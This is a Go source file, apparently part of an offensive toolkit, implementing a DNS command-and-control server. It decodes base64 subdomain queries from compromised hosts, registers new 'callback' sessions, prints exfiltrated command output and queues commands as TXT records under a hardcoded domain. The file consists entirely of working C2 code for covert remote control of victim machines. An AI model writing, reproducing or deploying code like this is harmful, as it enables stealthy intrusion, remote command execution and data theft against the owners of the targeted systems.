package completion

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"

	"github.com/miekg/dns"
)

func parseQuery(m *dns.Msg) {
	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeA:
			if !lineCacheCheck(Base64Encode(q.Name)) {
				sub := strings.Split(q.Name, ".")
				if sub[1] == "working" {
					currentDir = Base64Decode(sub[0] + "==")
				} else if sub[1] == "current" {
					curcmd = sub[0]
				} else if sub[1] == "host" {
					if !connectionExist(sub[2]) {
						AddConnection(sub[2])
						sessionID = sub[2]
						fmt.Println("New callback: " + Base64Decode(sub[0]) + ":" + sub[2])
					}

				} else {
					fmt.Print(Base64Decode(sub[0] + "=="))
					ip := records[q.Name]
					if ip != "" {
						rr, err := dns.NewRR(fmt.Sprintf("%s A %s", q.Name, ip))
						if err == nil {
							m.Answer = append(m.Answer, rr)
						}
					}
					lineCache(Base64Encode(q.Name))
				}
			}
		case dns.TypeTXT:
			ip := records[q.Name]
			if ip != "" {
				rr, err := dns.NewRR(fmt.Sprintf("%s TXT %s", q.Name, ip))
				if err == nil {
					m.Answer = append(m.Answer, rr)
				}
			}
		}
	}
}

func HandleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func Base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)
}

func AddTXTRecord(r string) {
	records[curcmd+"."+csessionID+".cmd.dns.gostripe.click."] = r
}

func lineCache(line string) {

	linecache = append(linecache, line)
}

func AddConnection(h string) {

	connectedHosts = append(connectedHosts, h)
}

func lineCacheCheck(cmd string) bool {
	return contains(linecache, cmd)
}

func connectionExist(h string) bool {
	return contains(connectedHosts, h)
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
